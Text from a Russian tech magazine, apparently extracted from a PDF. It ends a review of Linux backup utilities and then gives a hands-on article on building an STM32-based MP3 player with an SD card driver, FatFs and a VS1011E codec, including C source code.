 • Bareos. Парень из сооб щества разработчиков Bacula стал собирать откло‐
   ненные правки и на их основе начал свою ветвь разработки.


duplicity
Это консольная утилита, пос троенная на базе librsync и под держивающая
полное и инкре мен тное копиро вание. Duplicity сохраняет данные в tar‐архи‐
вах на удаленный или локальный фай ловый сервер и может использовать
GnuPG для их подписи и шифрования. На сайте проекта указаны поддержи‐
ваемые на текущий момент протоколы для работы с файловым сервером,
среди которых перечислены Dropbox, FTP, Google Drive, IMAP, MS Azure
и Onedrive, rsync, SSH/SCP.





       Простейший шифрованный бэкап с использованием duplicity

Duplicity предлагает следующие фичи:
 • работу с правами и атрибута ми файлов, символьными ссылками и фай‐
  лами устройств, но жесткие ссылки считает за обычные файлы;
 • исключения и включения для соз дания бэкапа, в том чис ле с регулярными
  выраже ниями;
 • сравнение содержимого директории с ее резервной копией;
 • логирование и восста новление к определен ной дате;
 • симметричное  и  асимметричное  шифрование  резервной  копии
   перед отправ кой на сервер. Не доверяешь облачному сервису? Этот
   вариант для тебя!

Здесь приведены, естес твенно, далеко не все воз можности duplicity, но эта
утилита имеет хорошую документацию с примера ми, которая не оставит
в беде неопытного юзера. Кроме того, к ней есть гра фический фронтенд Déjà
Dup с ограничен ным набором функций, но умеющий делать все самое необ‐
ходимое. В системе он может называться Backups.





                    Déjà Dup весьма лакони чен и прост



                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
       ЗАПАСЛИВЫЙ
          ПИНГВИН
                  ПРОГРАММЫ ДЛЯ РЕЗЕРВНОГО
                         КОПИРОВАНИЯ В LINUX





КОГДА ХОЧЕТСЯ ЧЕГО-НИБУДЬ ПОПРОЩЕ
Если ты настраиваешь резервное копирование для какой‐нибудь домашней
рабочей станции, то у тебя, наверное, нет осо бого желания ковыряться
в дебрях мануалов rsync или возиться с раз вертыванием Bacula. В этом слу‐
чае на помощь приходят Чип и Дейл нес ложные инс трументы, которые тихо
делают свое дело и не требуют слишком много моз гов времени на разверты‐
вание и настройку.


rsnapshot
Утилита, также разработанная на осно ве rsync, умеет делать инкре ментные
«снапшоты» файловой системы (а еще поддерживает LVM) и сохранять их
на локальной или удаленной машине по протоко лам SSH и rsync. На самом
деле она создает простые файловые копии. Умеет работать с включениями
и исключениями так же, как rsync, запус кать скрипты до и после выполнения
копирования. Для автоматизации задачи предлага ется использовать cron.
  Перед запуском утилиты необ ходимо нас троить конфиг /etc/rsnapshot.
conf. Все опции в нем хорошо проком ментирова ны, так что, если ты знаешь
английский хотя бы на уровне чтения конфигов, проб лем возникнуть не дол‐
жно. Пример простейшей настройки с изменени ем лишь пары строк можно
найти в этой статье (только теперь опцию interval заменила retain).





  Кусок файла конфигурации rsnapshot. Здесь мож но настроить прог‐
  раммы для выполнения отдельных задач, временные папки, интервалы
  для планирования и поведение утилиты в целом

Если с момента прошлого бэкапа какие‐то файлы не изменились, то rsnap‐
shot в целевой директории просто создаст жесткие ссылки на такие файлы
в пре дыдущем бэкапе. Кстати, она из коробки орга низует ротацию резервных
копий согласно заданному в конфиге количес тву одновре менно хранящихся
копий.





  Rsnapshot заставляет mv и rsync делать ротацию бэкапов. Обрати вни‐
  мание на второй стол бец в выводе ls — счетчик жестких ссылок

Разработчики предлагают немного муд реный раздел HOW‐TO, посвященный
тому, как восстановить файлы из бэкапа с правильным разграничением прав
пользователей — специальной опции для этого в rsnapshot пока нет. То есть
ты, скорее всего, резервную копию‐то сделаешь, а корректным восстанов‐
лением из нее будешь занимать ся уже «как‐нибудь потом» или же просто
воспользуешься cp. А вооб ще это неплохая консольная альтернатива с дос‐
тойным  арсе налом функций  на  случай,  если  тебе  лень  разбираться
с ассортиментом ключей rsync.


rdiff-backup
Проект вдохновлен rsync и позволяет создавать инкрементные файловые
копии. Rdiﬀ‐backup умеет сохранять бэкапы на локальной машине или в сети
по SSH, но тогда на второй машине тоже должен быть установлен rdiﬀ‐back‐
up. Для поддержки атрибутов файлов необходима дополнительная питонов‐
ская либа, но указывается, что с ними все равно могут возникнуть проблемы.
  Восстановление можно выполнить с помощью ключа ‐r с указанием нуж‐
ного бэкапа по точному времени его соз дания (в днях) или по номеру, считая
от последнего бэкапа. По каждой сес сии копирования тулза пишет файл ста‐
тистики, из которого можно увидеть, например, сколько файлов появи лось
или было удалено с момента пос леднего копирования и сколько времени
занял сам процесс.





  Rdiﬀ‐backup в ходе очередного бэкапа определя ет параметры хостовой
  файловой системы, а потом отка тывает на две копии назад

Разработчик почему‐то подчеркивает, что rdiﬀ — это Reverse diﬀerential back‐
up tool, то есть, в отличие от «обычного моющего средства», она может вос‐
становить старый вариант файла, а не только самую последнюю версию.
Это полезно, если ты случайно уда лил часть документа и созданный после
этого бэкап уже не содержит уничтоженных тобой данных. Хотя вооб ще‐то
не одна только эта программа позволя ет так делать. Еще во всех отзы вах,
которые мне удалось найти, отмечается, что rdiﬀ‐backup работает заметно
медленней в сравнении, например, с rsync и rsnapshot. Особенно когда
из нескольких тысяч файлов были изменены пара сотен.


Backupninja
Это программа для центра лизованного управления утилитами резервного
копирования, по сути обертка над их функциональ ностью. Базируется на du‐
plicity и rdiﬀ‐backup, то есть с ее помощью можно делать зашиф рованные
и подписанные копии и переда вать их по SSH. Также Backupninja умеет
делать tar‐архивы со сжа тием или без, копии баз данных MySQL, PostgreSQL,
OpenLDAP и subversion и писать копии на диски. Работает с Linux‐VServer.
Доступны исходники.
  В комплекте с Backupninja поставляется ninjahelper — псевдографичес кая
оболочка,  в  которой мож но  удоб но и  наглядно  настраивать  задания
для резервного копирования, не тратя время и силы на изучение ключей раз‐
ных утилит, хотя при наборе длинных путей прог рамме явно не хватает авто‐
дополнения.





              Меню соз дания задачи в ninjahelper


fwbackups
Графическая утилита с простым и понят ным интерфей сом, в которой можно
создавать «наборы резер вирования» (Sets) — про фили — и экспортировать
их. Бэкап сохраняется в виде архива или фай ловой копии локально либо
передается по SSH. Инкрементное копирование поддержи вается только
в случае файловых копий. Fwbackups умеет выполнять ротацию бэкапов
и восстановление из них.
  Можно указать в настройках расписания, в который час какого дня недели
и месяца следует выполнять копирование, либо можно запустить его вруч‐
ную. В расширенных опциях указываются команды, которые будут запуще ны
до и после выполнения резервного копирования, а также исключения. При‐
мечательно, что fwbackups позволяет выполнить разовую (One‐Time Backup)
копию без создания про филя.





            Создание набора резервирова ния в fwbackups


И ЧЕМ БЭКАПИТЬ?
Зависит от конкретной задачи. Большую часть типовых задач успешно решает
rsync: это своего рода столп синхрониза ции и резервного копирования в Lin‐
ux. На базе ее широчайших возможностей соз даются другие приложения
со своими особенностями: luckyBackup, rsnapshot, rdiﬀ‐backup и не только.
   Хочешь все и сразу? Попробуй duplicity и Bacula. Duplicity нацелена изна‐
чально на создание защищенных копий, для чего применяет шифрование
и цифровые подписи, но она не поддерживает жес ткие ссылки. Bacula —
это вообще целая инфраструктура, которую нет смыс ла разворачивать
для резервирования данных с одного компа, если только тебе не хочется
повозиться с настрой ками.
  Все рассмот ренные прог раммы умеют работать с сетью, так что они
как минимум подходят для организа ции резервно го копирования в SOHO.
Графические варианты позволяют нас троить все еще быстрее.
  В любом случае ману алов по перечисленно му в обзоре софту предос‐
таточно. Поэтому выбирай для каждой задачи подходящий инс трумент,
не забивай гвозди отверткой — и будет тебе счастье!
ТРЮКИ
 MP3-ПЛЕЕР
 СВОИМИ РУКАМИ





             КАК СОБРАТЬ
       И ЗАПРОГРАММИРОВАТЬ
         ГАДЖЕТ У СЕБЯ ДОМА





Мастерить свои электронные устройства —
занятие, может быть, и не очень прак‐
тичное, но увлекательное и познаватель‐
ное. В этой статье я расскажу, как я создал
собственный музыкальный пле ер. В резуль‐            Candidum                                                                                               duospirit@gmail.com
тате получит ся, конечно, не iPod nano (и
даже не mini), но зато мы посмотрим, как на
C работать с разным железом — SD‐кар‐
той, кодеком, экра ном и клавиатурой.


             INFO

                   В прошлой  статье  я рассказал,  как собирал
                      мобильный телефон, и некото рые приемы я поза‐
                     имствую из это го проекта.


Помню, как в 2004 году у меня появился MP3‐плеер и привел меня в полный
восторг. Памяти, у него, правда, было всего 128 Мбайт, что по тем временам
уже считалось скромным. Кроме того, плеер отличался очень дурной особен‐
ностью коверкать записанные на него файлы. Как объяснялось в инструкции,
это не баг, а «фича», то есть защита от копирования.
  Сейчас, конечно, MP3‐плееры уже не пользуются былой популярностью
и музыку все слушают с телефо нов, но в качестве цели для своего проекта
это неплохой выбор — не тривиальный, но впол не посильный.
   Итак, от своего проекта я хотел, чтобы:
 • устройство (очевидно) вос производило MP3;
 • поддерживались современные карты SD;
 • в качестве файловой сис темы использовалась FAT;
 • качество звучания было приемлемым;
 • по возможности было невысокое энергопот ребление.


КОМПОНЕНТЫ
За основу устройства я взял недорогой MP3‐кодек VS1011E. На самом деле
разумнее     было     бы     выб рать     более     продвинутые
VS1053 или VS1063 или обновленную версию VS1011 — VS1003 (у нее так‐
товая частота выше), стоят они все примерно одинаково.
  Однако вникать в эти тонкости я не стал и остановил ся на первой попав‐
шейся микросхеме. В качес тве контроллера я взял STM32F103C8T6, чтобы
можно было сделать макет, используя готовую пла ту Blue Pill, а уже потом
собрать все по‐серьезному. Экран я выб рал TFT, разрешение — 128 на 160
(ST7735). У меня для него уже есть написанные ранее библиотеки.
   Код, как и в случае с телефоном, мы будем писать на C с использованием
библиотек libopencm3 и FatFs.
   Устройство будет работать прос то: читать данные из файла на флешке
и скармливать кодеку, а все остальное кодек сделает сам.


МАКЕТ
Прежде чем переходить к коду, есть смысл соб рать макет устройства (я вооб‐
ще поклонник отладки прог рамм на реальном железе). Берем плату Blue Pill
и подпаиваем к ней модуль дисплея с картодержателем. Пайка позволяет
нам не сталкиваться с проблемой дребез га соединений, которая может дос‐
тавить много неприятностей на этапе отладки.
   Тестовый модуль для VS1011 я соб рал на макетке, использовав переход‐
ник с QNF48 на DIP, схему которого я пос мотрел в даташи те. На самом деле
так заморачиваться необязательно — можно взять готовый модуль. Но у меня
его не было, а ждать не хотелось.
  В итоге я все это соб рал за несколько часов и был готов переходить
к коду.





                          Схема плеера





                    Ма кет устройства





                Ма кетная плата кодека VS1011





                Ма кетная плата кодека VS1011





           Дисплей макета с ранним вариантом интерфейса


ШАБЛОН БУДУЩЕЙ ПРОГРАММЫ
Прежде чем писать основные функции, полезно ини циализировать дис плей
и клавиатуру. Про дисплей я уже говорил выше, а клавиатура четыре
на четыре кнопки у меня оста лась от макета телефона.
  В исходнике ниже — стандартные заголовочные файлы, функции ини‐
циализации периферии, функции инициализации дисплея и клавиатуры и в
конце вывод строчки Hello world.



sd.c
#include <libopencm3/stm32/rcc.h>
#include <libopencm3/stm32/gpio.h>
#include <libopencm3/stm32/spi.h>
#include "st7735_128x160.h"
#include "st_printf.h"
#include "4x4key.h"


static void key_init(void){
  // Инициализация клавиатуры четыре на четыре
}
static void spi2_init(void){
  //spi2 ‐ vs1011
  /* Configure GPIOs:
   *
   * SCK=PB13
   * MOSI=PB15
   * MISO=PB14
   *
   * for vs1011e
   * VS_CCS PB6
   * VS_RST PB9
   * VS_DREQ PB8
   * VS_DCS PB5
   *
   */
  ...
}


static void spi1_init(void){
  //spi1 ‐ display
  /* Configure GPIOs:
   *
   * SCK=PA5
   * MOSI=PA7
   * MISO=PA6
   *
   * for st7735
   * STCS PA1
   * DC=PA3
   * RST PA2
   *
   * for SD card
   * SDCS PA0
   */
}


void main(){
  rcc_clock_setup_in_hse_8mhz_out_72mhz();
  spi1_init();
  spi2_init();
  st7735_init();
  st7735_clear(BLACK);
  st7735_set_printf_color(GREEN,BLACK);
  stprintf("Display is OK!\r\n");
  key_init();
  while(1) __asm__("nop");
}

Также в мейкфайле нужно добавить директорию с исходниками библиотек
и сами библиоте ки. Ниже — фраг мент Makefile:


...
SHARED_DIR = ./inc ./fatfs
CFILES = sd.c
CFILES += st7735_128x160.c st_printf.c
CFILES += 4x4key.c
...


ДРАЙВЕР КАРТЫ SD
Без драйвера работать с карточка ми SD никак не получится, поэтому начнем
с него. Чтение и запись дисков SDHC происходит блоками по 512 байт. Наш
драйвер должен уметь: записывать блок на диск, читать блок с диска и ини‐
циализировать диск.


        WWW

                     Найти документацию по работе с картами SD
                      по SPI — не проблема, она есть в том числе
                       на русском.
                     •STM. Урок 88. SD. SPI. FATFS
                     •Учимся работать с SDHC/SDXC‐картами по про‐
                          токолу SPI
                   •How to Use MMC/SDC


Тем не менее тут есть нес колько важных и не очень очевидных моментов, зна‐
ние которых сильно ускорит написа ние и отладку драйвера. Во‐первых, если
вместе с SD на шине SPI сидят другие устройства, то инициализировать SD
нужно первой, иначе она не заведется.
   Во‐вторых, инициализацию надо про изво дить на дос таточно низкой час‐
тоте шины (около 500 кГц), иначе SD не отвечает. Уже потом можно вык‐
ручивать частоту на максимум (у меня стоит 36 МГц, это около 4 Мбит/с).
   В‐третьих, карты SD бывают нес коль ких типов и инициализация у каждого
типа своя. Я ориентировался на наиболее современные и распространенные
сейчас карты SDHC, и мой вариант функции инициализации написан именно
для них.
  В примерах на сайте Элма Чана можно найти универсальную функцию
инициализации. Собственно, я старался написать минимально необходимый
драйвер, поэтому он поддерживает только один тип карт, а также запись
и чтение по одному сектору. Впрочем, во время отладки стало ясно, что мно‐
госекторные чтение и запись и не нужны.
  Обрати внимание, что перед отправкой команд инициализации по шине
нужно передавать 80 тактовых импульсов при высоком уровне на контакте CS
карты. Это нужно для переключения SD в режим SPI (обычный режим карты —
SDIO). После этого CS опус кают и начина ют ини циализацию, на которой я
останавливаться не буду.



sdcard.c
uint8_t sd_init(){
  uint8_t n, cmd, ty, ocr[4];
  uint16_t i;
  for(n=10; n; n‐‐) spi_xfer(SDSPI,0xff); // 80 dummy clocks
  ty = 0;


  SDCS_DOWN();
  // Enter Idle state
  send_cmd(CMD0, 0);
  // SDHC


  if (send_cmd(CMD8, 0x1AA) == 1){
    // Get trailing return value of R7 response
    for (n = 0; n < 4; n++) ocr[n] = spi_xfer(SDSPI,0xff);
    // The card can work at VDD range of 2.7‐3.6V
    if (ocr[2] == 0x01 && ocr[3] == 0xAA){
      // Wait for leaving idle state (ACMD41 with HCS bit)
      i=0xfff;
      while (‐‐i && send_cmd(ACMD41, 1UL << 30));
      if (i && send_cmd(CMD58, 0) == 0){
        // Check CCS bit in the OCR
        for (n = 0; n < 4; n++) ocr[n] = spi_xfer(SDSPI,0xff);
        ty = (ocr[0] & 0x40) ? CT_SD2 | CT_BLOCK : CT_SD2;
      }
    }
  }
  SDCS_UP();
  return ty;
}

У карточек SD есть неприятная склонность держать MISO в высоком сос‐
тоянии еще несколько тактов CLK после подачи низкого уровня на CS.
Это лечится передачей байта 0xFF по шине при высоком уровне на CS. Впро‐
чем, в моем случае это не критично.
  Ниже — read и write из файла sdcard.c.


uint8_t sd_read_block(uint8_t *buf, uint32_t lba){
  uint8_t result;
  uint16_t cnt=0xffff;
  SDCS_DOWN();
  result=send_cmd(CMD17, lba); // CMD17 даташит с. 50 и 96
  if(result){SDCS_UP(); return 5;} // Выйти, если результат не 0x00


  spi_xfer(SDSPI,0xff);
  cnt=0;
  do result=spi_xfer(SDSPI,0xff); while ((result!=0xFE)&&‐‐cnt);
  if(!cnt){SDCS_UP(); return 5;}


  for(cnt=0;cnt<512;cnt++) *buf++=spi_xfer(SDSPI,0xff);
  // Получаем байты блока из шины в буфер
  spi_xfer(SDSPI,0xff); // Пропускаем контрольную сумму
  spi_xfer(SDSPI,0xff);
  SDCS_UP();
  spi_xfer(SDSPI,0xff);
  return 0;
}


uint8_t sd_write_block (uint8_t *buf, uint32_t lba){
  uint8_t result;
  uint16_t cnt=0xffff;
  SDCS_DOWN();
  result=send_cmd(CMD24,lba); // CMD24 даташит с. 51 и 97–98
  if(result){SDCS_UP(); return 6;} // Выйти, если результат не 0x00


  spi_xfer(SDSPI,0xff);
  spi_xfer(SDSPI,0xfe); // Начало буфера
  for (cnt=0;cnt<512;cnt++) spi_xfer(SDSPI,buf[cnt]); // Данные
  spi_xfer(SDSPI,0xff);
  spi_xfer(SDSPI,0xff);
  result=spi_xfer(SDSPI,0xff);
  // result=wait_ready();
  if((result&0x05)!=0x05){SDCS_UP(); return 6;}
  //spi_xfer(SDSPI,0xff);
  WSPI();


  // Выйти, если результат не 0x05 (Даташит с. 111)
  // if(wait_ready()==0xFF){SDCS_UP(); return 6;}
  SDCS_UP();
  spi_xfer(SDSPI,0xff);
  return 0;
}

После того как я пару дней проковырялся с логическим анализатором, эта
штука стала инициализироваться, читать и писать.
   Теперь надо добавить библиотеку sdcard.c и ее заголовочный файл
в проект, а в функцию main() — инициализацию SD‐карты. И тут мы вспо‐
минаем, что SPI1 у нас настроен на низкую скорость для успешной инициали‐
зации (FCPU/128 ~500 кГц), а с экраном на такой ско рости работать неудоб‐
но. Поэтому добавляем функцию spi1_forsage(void), которая, по сути, пов‐
торно инициализирует SPI1, но с повышен ной час тотой (FCPU/2 36 МГц).


...
static void spi1_forsage(void){
  ...
}
...
void main(){
  ...
  spi1_init();
  ...
  sd_init();
  spi1_forsage();
  ...
}

SD‐карта у нас теперь есть, но для работы нужна еще файловая система.


Нес коль ко слов про отладку
Раньше я для отладки час то использовал вывод по UART, однако когда
у устройства есть свой дисплей и на него нап равлен стандартный вывод, то
не  нужно даже  подключать  UART,  достаточно  пользоваться функцией
stprintf(). Именно с ее помощью я анализировал вызовы discio.c.
  Ниже — пример отладочных сооб щений в discio.h (отладочные команды
закомментированы).


 DRESULT disk_write(BYTE pdrv, const BYTE *buff, LBA_t sector, UINT
 count){
   //SDCS_UP();
   //stprintf("d_w(pdrv=%d,sec=%d,cnt=%d\r\n",pdrv,sector,count);
   //SDCS_DOWN();
   uint8_t ret=0;
   //if(count==1){
     //ret=sd_write_block(buff,sector);
     //stprintf("w_ret_code=%d",ret);
     //if(ret==6) return RES_ERROR;
   //} else return RES_ERROR;


   while(count){
     if(sd_write_block(buff,sector)) return RES_ERROR;
     ‐‐count;
     ++sector;
     buff+=512;
   }
   //stprintf("WresOK\r\n");
   return RES_OK;
 }


В результате при каждом вызове функции disk_write() на экран выводятся
передаваемые ей аргументы и воз вра щаемое значение sd_write_block().
Я дол го не мог понять, почему запись на диск через FatFs не получается, хотя
логический анализатор говорит, что все идет как надо: и прямой вызов фун‐
кции sd_write_block(), и последу ющий вызов sd_read_block() показы‐
вали, что запись и чтение работают.
  Оказалось, что функция sd_write_block() успешно выполняла запись,
но не возвращала 0 и FatFs считала это ошиб кой записи. Ошибку я исправил,
а отладочные сообщения закомментирова ны.
   Также в отладке крайне полезен логический ана лизатор Saleae Logic (точ‐
нее, его китайский клон) и одноименная программа, которая отлично работа‐
ет в Linux и очень помога ет при отладке про токолов.





                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
         MP3-ПЛЕЕР
    СВОИМИ РУКАМИ
               КАК СОБРАТЬ И ЗАПРОГРАММИРОВАТЬ
                            ГАДЖЕТ У СЕБЯ ДОМА





FATFS
Чтобы прочитать файл с карточки, его нужно сна чала туда как‐то записать.
И удобнее всего это сделать, когда на карте есть файловая система. Так что
подклю чаем ее к компьютеру, форматиру ем и копиру ем нужные файлы.
  Писать свой драйвер файловой сис темы ради плеера — это все же нем‐
ного слишком даже для меня, но существу ет драй вер FatFs, написанный на C
и легко портируемый на что угодно.


        WWW

                      Скачать  исходный  код  FatFs  и  ознакомиться
                        с подробным описанием можно на все том же
                       сайте Элма Чана.


Для того чтобы добавить FatFs в проект, надо сделать несколько вещей. Пер‐
вая из них — вне сение изменений в файл ffconf.h.


#define FF_CODE_PAGE  866 // 866 — кириллическая кодовая страница
#define FF_USE_LFN    1   // Поддержка длинных имен
#define FF_MAX_LFN    255 // Максимальная длина имени, памяти у нас
все равно полно
#define FF_LFN_UNICODE  2 // Кодировка UTF‐8
#define FF_STRF_ENCODE  3 // Кодировка UTF‐8
#define FF_FS_NORTC     1 // Заглушка для функции получения
реального времени

Этого достаточно. Без поддержки кириллицы нам будет грустно, а кодировку
UTF‐8 я выбрал, так как использую ее на десктопе и она значительно упро‐
щает операции с файлами.
   Теперь нужно отредактировать файл diskio.c. Находя щиеся в нем фун‐
кции связывают FatFs с драйвером карты SD, который мы обсуждали выше.
Вносим необходимые изменения.


...
#include "sdcard.h"
#include "st_printf.h"
...
DSTATUS disk_initialize(BYTE pdrv){
  return 0;
}

Это просто заглушка, так как инициализацию диска мы выполняем вручную
в другом месте. Вся эта чехарда свя зана с тем, что карту SD нужно инициали‐
зировать первой на шине.


DRESULT disk_read(BYTE pdrv, BYTE *buff, LBA_t sector, UINT count){
  //stprintf("d_r(pdrv=%d,sec=%d,cnt=%d\r\n",pdrv,sector,count);
  while(count){
    if (sd_read_block(buff,sector)) return RES_ERROR;
    ‐‐count;
    ++sector;
    buff+=512;
  }
  //stprintf("resOK\r\n");
  return RES_OK;
}

Здесь можно было бы добавить мультисекторное чтение, это поднимет быс‐
тродействие, однако для данного проекта это не так важно. То же можно ска‐
зать про запись.


DRESULT disk_write(
  BYTE pdrv,        // Номер физического диска
  const BYTE *buff, // Данные, которые будут записаны
  LBA_t sector,     // Стартовый сектор в LBA
  UINT count        // Число секторов для записи
){
  ...
  while(count){
    if(sd_write_block(buff,sector)) return RES_ERROR;
    ‐‐count;
    ++sector;
    buff+=512;
  }
  //stprintf("WresOK\r\n");
  return RES_OK;
}

И последняя функция, которую нужно подпра вить, — тоже заглушка.


DRESULT disk_ioctl(
  BYTE pdrv,    // Номер физического диска
  BYTE cmd,     // Управляющий код
  void *buff    // Буфер для отправки и получения управляющего кода
){
  if(cmd == GET_SECTOR_SIZE) {
    *(WORD*)buff = 512;
    return RES_OK;
  }
  return RES_OK;
}

Теперь добавляем заголо вочные файлы (ff.h) в проект, а исходный код (ff.
c, diskio.c и ffunicode.c) — в Makeﬁle. Готово! У нас теперь есть поддер‐
жка файловых систем FAT12, 16 и 32.


        WWW

                   В блоге «Записки программиста» есть неп лохая
                         статья про работу с библиоте кой FatFs.



АУДИОКОДЕК VS1011E
Аудиокодек достаточ но прост в обращении. Его интерфейс (SPI) имеет два
режима: режим команд (включается низким уровнем на CCS) и режим данных
(включается низким уровнем на DCS). То есть со стороны это выглядит
как два независимых устройства SPI на шине.
  Кроме того, исполь зует ся еще два вывода DREQ и RST. С RST все понят‐
но — низкий уровень на нем вызывает перезагрузку чипа. DREQ же показы‐
вает готов ность чипа принять 32 байта данных по шине.
   Это семипроводное подключение чипа, которое позволя ет посадить его
на одну шину SPI с другими устройства ми. Однако при сборке и настрой ке
макета оказалось, что держать дисплей, карту SD и VS1011E на одной шине
неудобно. Связано это в первую очередь с ограниче нием скорости шины
VS1011. В даташите указано, что максимальная частота шины — FCPU/6, то
есть в моем случае 12 * 2/6 = 4 МГц. Для дисплея и карты памяти это слиш‐
ком медленно, и в результате звук будет лагать, что неприемлемо.
  Конечно, можно было динамичес ки менять скорость шины, но я решил
просто перенести кодек на второй SPI, бла го у моей STM их два.


             INFO

                 О подключении и протоколе обмена данными
                        с VS1011E есть отдельный апноут VS1011e SPI AN,
                      там даже приведены примеры функций обмена
                      данными для разных вариантов подключения. А в
                       написании драйвера VS1011 нам поможет апноут
                      VS1011E Play AN.


Итак, чтобы наш плеер заиграл, на кодек нужно слать данные пачками
по 32 байта и учитывать готовность чипа принимать данные. Удобно, что он
пропустит заголовки MP3, поэто му файл можно передавать целиком, что
упрощает задачу.
  Приступим. Вот как начина ются функции чтения и записи в управляющие
регистры.


#define VS_CCS_DOWN() gpio_clear(VS_PORT, VS_CCS)
#define VS_CCS_UP() gpio_set(VS_PORT, VS_CCS)
#define DREQ() gpio_get(VS_PORT, VS_DREQ)
#define VS_W_SPI() while(SPI_SR(VS_SPI) & SPI_SR_BSY)


...
// Запись в регистр
void vs_write_sci(uint8_t addr, uint16_t data){
  while (!DREQ());        // Ждем готовности чипа принять данные
  VS_CCS_DOWN();          // Режим команд
  spi_xfer(VS_SPI, 2);    // 2 — команда записи
  spi_xfer(VS_SPI, addr); // Адрес регистра
  spi_xfer(VS_SPI, (uint8_t)(data>>8));
  spi_xfer(VS_SPI, (uint8_t)(data&0xff));
  VS_CCS_UP();
}


// Чтение из регистра
uint16_t vs_read_sci(uint8_t addr){
  uint16_t res;
  while (!DREQ());        // Ждем готовности чипа принять данные
  VS_CCS_DOWN();          // Режим команд
  spi_xfer(VS_SPI, 3);    // 3 — команда чтения
  spi_xfer(VS_SPI, addr); // Адрес регистра
  res=spi_xfer(VS_SPI, 0xff);
  res<<=8;
  res|=spi_xfer(VS_SPI, 0xff);
  VS_CCS_UP();
  return res;
}

Теперь нужна функция отправки данных, данные передаются массивами
до 32 байт. Тут все похоже на предыдущую функцию, но чип переводится
в режим данных, и нет необходимос ти посылать специальную команду, можно
слать данные сразу.


#define VS_DCS_DOWN() gpio_clear(VS_PORT, VS_DCS)
#define VS_DCS_UP() gpio_set(VS_PORT, VS_DCS)
#define DREQ() gpio_get(VS_PORT, VS_DREQ)
#define VS_W_SPI() while(SPI_SR(VS_SPI) & SPI_SR_BSY)


...
uint8_t vs_write_sdi(const uint8_t *data, uint8_t count){
  if(count>32) return 1;
  while(!DREQ());
  VS_DCS_DOWN();
  while(count‐‐) spi_xfer(VS_SPI, *data++);
  VS_W_SPI();
  VS_DCS_UP();
  return 0;
}

Теперь мы можем инициализировать чип. Для это го ему надо ненадолго
опустить RST, после чего уста новить биты SM_SDINEW и SM_RESET в регистре
SCI_MODE. Напоследок нужно выс тавить корректное значение частоты кварца
в регистре SCI_CLOCKF, для чего используется удоб ный макрос HZ_TO_SCI_‐
CLOCKF(hz). Это важно для корректной ско рости вос произведения.


// Этот макрос для VS1011 автоматически установит
// удвоение частоты, если XTALI < 16 МГц
#define HZ_TO_SCI_CLOCKF(hz) ((((hz)<16000000)?0x8000:0)+((hz)+1000)/
2000)
#define SCI_MODE    0x00
#define SCI_CLOCKF  0x03
#define SCI_VOL     0x0B
#define SM_RESET    (1<< 2)


uint8_t vs_init(){
  gpio_clear(VS_PORT,VS_RST); // Опускаем ненадолго ресет
  VS_CCS_UP(); // На всякий случай поднимаем CCS и DCS
  VS_DCS_UP();
  gpio_set(VS_PORT,VS_RST); // Поднимаем ресет


  vs_write_sci(SCI_MODE, SM_SDINEW|SM_RESET); // Устанавливаем
  // режим обмена данными и делаем софтверный ресет,
  // как рекомендовано в даташите и апнотах,
  // указываем частоту кварца, так как у нас нестандартная 12 МГц
  vs_write_sci(SCI_CLOCKF, HZ_TO_SCI_CLOCKF(12000000));


  // Устанавливаем громкость на 6 дБ ниже максимума
  // Максимум громкости — 0x0000, минимум — 0xfefe,
  // старший и младший байты независимо задают
  // громкость каналов
  vs_write_sci(SCI_VOL, 0x3f3f);
  return 0;
}

Теперь можно перейти непосредственно к проигры ванию файлов.


РЕАЛИЗАЦИЯ ПЛЕЕРА
В упомянутом выше апноуте VS1011 AN Play есть пример реализации пле‐
ера — на него‐то я и ориентировался.
   Рассмотрим работу фун кции play_file(char *name). Открываем MP3‐
файл функциями FatFs, читаем оттуда 512 байт в буфер и начинаем отдавать
данные из буфера в кодек группами по 32 байта по мере готовности чипа их
принять. Впрочем, ожидание готовности уже есть в функции vs_write_sdi(),
так что тут об этом можно не задумываться.
  После отправки нескольких таких пакетов мож но опросить клавиату ру
и интерфейс (чтобы прибавлялся прогресс‐бар, например). Когда буфер
опустеет, считываем еще 512 байт и повторя ем снова. Если файл закончится
раньше, чем заполнится буфер, — не страш но, будем отдавать по 32 байта,
пока есть такая возможность, а последний пакет будет короче 32 байт.
Для определения таких случаев используем макрофункцию min(a,b).


#define FILE_BUFFER_SIZE 512
#define SDI_MAX_TRANSFER_SIZE 32
#define SDI_END_FILL_BYTES 512 // Здесь может быть любое значение
#define min(a,b) (((a)<(b))?(a):(b))


uint8_t play_file(char *name){
  ...
  FIL file;
  uint8_t playBuf[512];
  uint16_t bytes_in_buffer, bytes_read, t; // Сколько байтов
осталось в буфере
  uint32_t pos=0, cnt=0, fsize=0;          // Позиция в файле
  uint32_t nread;
  uint16_t sr,dt,min,sec,hdat0;
  uint8_t key,bar=0,bitrate=8;
  ...
  if(f_open(&file, name, FA_READ)) stprintf("open file error!\r\n");
  ...


  do{
    f_read(&file, playBuf, FILE_BUFFER_SIZE, &bytes_read);
    uint8_t *bufP = playBuf;
    bytes_in_buffer=bytes_read;


    do{
      t = min(SDI_MAX_TRANSFER_SIZE, bytes_in_buffer);
      vs_write_sdi(bufP, t);
      bufP += t;
      bytes_in_buffer ‐= t;
      pos += t;
    } while (bytes_in_buffer);


    cnt++;
    if(cnt>bitrate){
      cnt=0;
      // Здесь опрашиваем клавиатуру и рисуем интерфейс
    }
  } while(bytes_read==FILE_BUFFER_SIZE);


  return CODE;
}

Такая вот по сути нехитрая функция, если уда лить из нее рюшечки и все, свя‐
занное с интерфейсом, но в таком виде функция неудобна, поэтому реали‐
зуем интерфейс.


ИНТЕРФЕЙС
Про вывод на дисплей 128 на 160 на плате ST7735 я уже писал в статье
про телефон. Однако для это го проекта пришлось реализовать поддержку
UTF‐8, хоть и в урезанном виде. Поддерживаются символы латиницы и кирил‐
лицы (без буквы ё). Это упростило переделку с CP866 — я лишь немного
переставил символы в таб лицах, поправил поиск символа и добавил игно‐
рирование кодов с символами 0xD0 и 0xD1 — префиксов кириллической
страницы.



st7735_128x160.c
oid st7735_drawchar(unsigned char x,unsigned char y,char chr,
                    uint16_t color, uint16_t bg_color){
  ...
  // Добавлена поддержка кириллицы UTF‐8
  unsigned char c=(chr<0xe0) ? chr ‐ 0x20 : chr ‐ 0x50;
  ...
}


void st7735_string_at(unsigned char x,unsigned char y,
                      unsigned char *chr, uint16_t color,
                      uint16_t bg_color){
  ...
  while(*chr){
#ifdef UTF8ASCII
